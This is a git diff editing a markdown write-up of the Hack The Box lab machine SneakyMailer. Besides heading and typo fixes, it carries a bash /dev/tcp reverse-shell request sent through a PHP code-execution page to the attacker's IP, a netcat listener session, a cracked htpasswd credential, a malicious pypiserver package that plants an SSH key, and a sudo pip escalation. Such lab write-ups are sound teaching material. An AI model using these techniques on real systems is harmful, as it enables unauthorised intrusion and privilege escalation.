@@ -122,6 +122,8 @@ Nmap done: 1 IP address (1 host up) scanned in 81.28 seconds
 
 21,22,25,80,143,993,8080 open
 
+### Port 21 - FTP
+
 ```text
 ┌──(zweilos㉿kali)-[~/htb/sneakymailer]
 └─$ ftp 10.10.10.197
@@ -136,7 +138,7 @@ ftp> exit
 
 First I tried anonymous login through FTP, but was denied access.
 
-
+### Port 80 - HTTP
 
 port 80 - redirected to [http://sneakycorp.htb/](http://sneakycorp.htb/) - added to /etc/hosts
 
@@ -273,6 +275,8 @@ on dev.sneakycorp.htb found a site that was almost identical to main page, thoug
 
 Tried to register again
 
+### Port 8080 - HTTP
+
 ![](../../.gitbook/assets/4-dev-sneakycorp-8080.png)
 
 Decided to check out the port 8080 on each of the virtual hosts, dev did not lead anywhere
@@ -291,7 +295,9 @@ found pypiserver version 1.3.2 - newest is 1.4.2
 
 [https://blog.pentesteracademy.com/learn-to-interact-with-pypi-server-in-3-minutes-71d45fa46273](https://blog.pentesteracademy.com/learn-to-interact-with-pypi-server-in-3-minutes-71d45fa46273)
 
-### Verifying valid email addresses
+### Port 25 - SMTP
+
+#### Verifying valid email addresses
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/sneakymailer]
@@ -653,7 +659,7 @@ Since I now had credentials, I though it would most likely log into the PyPI ser
 
 nothing in packages
 
-![](../../.gitbook/assets/8-pypi-loggged-in2.png)
+![](../../.gitbook/assets/8-pypi-loggged-in2%20%282%29.png)
 
 nor in the index page
 
@@ -830,7 +836,7 @@ system($var);
 
 ![](../../.gitbook/assets/7-code-exec.png)
 
-Using this I was able to identify that I was running in the context of www-data
+Using this I was able to identify that I was running in the context of `www-data`.
 
 ![](../../.gitbook/assets/7-etc-passwd.png)
 
@@ -847,24 +853,16 @@ Next I tried adding my public SSH key to both `low` and `developer` since they c
 got running processes, etc/passwd, could not add ssh keys, next tried reverse shell
 
 ```text
-GET /php-code-exec.php?var=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.174/44445+0>%261' HTTP/1.1
+GET /php-code-exec.php?var=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.174/46445+0>%261' HTTP/1.1
 
 Host: dev.sneakycorp.htb
-
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
-
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-
 Accept-Language: en-US,en;q=0.5
-
 Accept-Encoding: gzip, deflate
-
 Connection: close
-
 Upgrade-Insecure-Requests: 1
-
 DNT: 1
-
 Sec-GPC: 1
 ```
 
@@ -875,17 +873,17 @@ zweilos@kali:~/htb/sneakymailer$ script sneaky-transcript
 Script started, output log file is 'sneaky-transcript'.
 ┌──(zweilos㉿kali)-[~/htb/sneakymailer]
 └─$ bash                
-zweilos@kali:~/htb/sneakymailer$ nc -lvnp 44445
-listening on [any] 44445 ...
+zweilos@kali:~/htb/sneakymailer$ nc -lvnp 46445
+listening on [any] 46445 ...
 connect to [10.10.14.174] from (UNKNOWN) [10.10.10.197] 60704
 bash: cannot set terminal process group (725): Inappropriate ioctl for device
 bash: no job control in this shell
 www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ python -c 'import pty;pty.spawn("/bin/bash")'
 </dev$ python -c 'import pty;pty.spawn("/bin/bash")'
 www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ ^Z
-[1]+  Stopped                 nc -lvnp 44445
+[1]+  Stopped                 nc -lvnp 46445
 zweilos@kali:~/htb/sneakymailer$ stty raw -echo
-zweilos@kali:~/htb/sneakymailer$ nc -lvnp 44445
+zweilos@kali:~/htb/sneakymailer$ nc -lvnp 46445
 
 www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ export TERM=xterm-256color
 www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ id && hostname
@@ -894,7 +892,23 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 sneakymailer
 ```
 
-started enumeration
+started enumeration \(remembered to switch to bash this time since zsh seems to have problems with upgrading nc shells\)
+
+```text
+www-data@sneakymailer:~/sneakycorp.htb$ cd /home
+www-data@sneakymailer:/home$ ls
+low  vmail
+www-data@sneakymailer:/home$ cd vmail
+bash: cd: vmail: Permission denied
+www-data@sneakymailer:/home$ ls -la
+total 16
+drwxr-xr-x  4 root  root  4096 May 14 17:10 .
+drwxr-xr-x 18 root  root  4096 May 14 05:30 ..
+drwxr-xr-x  8 low   low   4096 Jun  8 03:47 low
+drwx------  5 vmail vmail 4096 May 19 21:10 vmail
+```
+
+in the `/home` directory there were only two folders, `low`, and `vmail`
 
 ```text
 www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ ls -la
@@ -927,23 +941,7 @@ www-data@sneakymailer:~/pypi.sneakycorp.htb$ cat .htpasswd
 pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/
 ```
 
-found what looked like a hash for pypi in the pypi.sneakycorp.htb folder
-
-```text
-www-data@sneakymailer:~/sneakycorp.htb$ cd /home
-www-data@sneakymailer:/home$ ls
-low  vmail
-www-data@sneakymailer:/home$ cd vmail
-bash: cd: vmail: Permission denied
-www-data@sneakymailer:/home$ ls -la
-total 16
-drwxr-xr-x  4 root  root  4096 May 14 17:10 .
-drwxr-xr-x 18 root  root  4096 May 14 05:30 ..
-drwxr-xr-x  8 low   low   4096 Jun  8 03:47 low
-drwx------  5 vmail vmail 4096 May 19 21:10 vmail
-```
-
-in the /home directory there were only two folders, low, and vmail
+found what looked like a hash for a user `pypi` in `.htpasswd` in the `pypi.sneakycorp.htb` folder
 
 ```text
 ┌──(zweilos㉿kali)-[~]
@@ -1035,13 +1033,22 @@ Stopped: Wed Nov 11 15:55:16 2020
 
 The password enabled me to log in to `http://pypi.sneakycorp.htb:8080/` with the creds `pypi:soufianeelhaoui`
 
-There was nothing interesting on either of the sites linked on this page however. I went back to the machine and tried to switch users to `developer` with the credentials mentioned in the email
+![](../../.gitbook/assets/8-pypi-loggged-in%20%281%29.png)
+
+![](../../.gitbook/assets/8-pypi-loggged-in2%20%281%29.png)
+
+There was nothing interesting on either of the sites linked on this page however. 
 
 ```text
-developer@sneakymailer:/dev/shm/pypkg$ id
-uid=1001(developer) gid=1001(developer) groups=1001(developer)
 www-data@sneakymailer:~/pypkg$ su developer
 Password: 
+developer@sneakymailer:/dev/shm/pypkg$ id
+uid=1001(developer) gid=1001(developer) groups=1001(developer)
+```
+
+I went back to the machine and tried to switch users to `developer` with the credentials mentioned in the email, and found myself logged in as `developer`. 
+
+```text
 developer@sneakymailer:/dev/shm/pypkg$ sudo -l
 
 sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
@@ -1051,7 +1058,7 @@ Sorry, try again.
 Sorry, user developer may not run sudo on sneakymailer.
 ```
 
-I had a wierd network hiccup that caused authentication to fail the first try, but then I found out that this user was not able to run commands with `sudo`
+I had a weird network hiccup that caused authentication to fail the first try, but then I found out that this user was not able to run commands with `sudo`
 
 [https://pypi.org/project/pypiserver/\#upload-with-setuptools](https://pypi.org/project/pypiserver/#upload-with-setuptools)
 
@@ -1110,7 +1117,7 @@ setuptools.setup(
 )
 ```
 
-I first tried writing my ssh key to `low` but the script was being run in the context of `developer` and not being installed for some reason. I added a check to make sure that `low` \(userID 1000\) was the one running it. Next I followed the instructions to install the package into pypiserver
+I first tried writing my public SSH key to `low` but the script was being run in the context of `developer` and not being installed for some reason. I added a check to make sure that `low` \(userID 1000\) was the one running it. Next I followed the instructions to install the package into pypiserver
 
 ```text
 [distutils]
@@ -1198,7 +1205,7 @@ low@sneakymailer:~$ cat user.txt
 06106e8ea4721e1a01714bf6ef000a88
 ```
 
-Next I tried logging in with the ssh key I had made and was successful! I got that same temporary name resolution error when using `sudo -l`, where it seemed to hang for a minute, but this time I got a very interesting result!
+Next I tried logging in with the ssh key I had made and was successful!  I got that same temporary name resolution error when using `sudo -l`, where it seemed to hang for a minute, but this time I got a very interesting result!
 
 ```text
 low@sneakymailer:/dev/shm/fin$ pip3 install setup.py
@@ -1209,7 +1216,7 @@ Collecting setup.py
 No matching distribution found for setup.py
 ```
 
-searching for ways to privilege escalation with sudo pip3 leads to [https://gtfobins.github.io/gtfobins/pip/](https://gtfobins.github.io/gtfobins/pip/)
+A search for ways to privilege escalation with sudo and pip3 led to [https://gtfobins.github.io/gtfobins/pip/](https://gtfobins.github.io/gtfobins/pip/)
 
 > File write It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.
 
@@ -1276,9 +1283,11 @@ drwxr-xr-x  3 root root 4096 May 14 12:57 .local
 81337e5b7eb0c72e251736d031a72998
 ```
 
-Thanks to [`<box_creator>`](https://www.hackthebox.eu/home/users/profile/<profile_num>) for something interesting or useful about this machine.
+fine
 
 ![](../../.gitbook/assets/sneakymailer-pwned.png)
+
+Thanks to [`<box_creator>`](https://www.hackthebox.eu/home/users/profile/<profile_num>) for something interesting or useful about this machine.
 
 If you like this content and would like to see more, please consider supporting me through Patreon at [https://www.patreon.com/zweilosec](https://www.patreon.com/zweilosec).
 
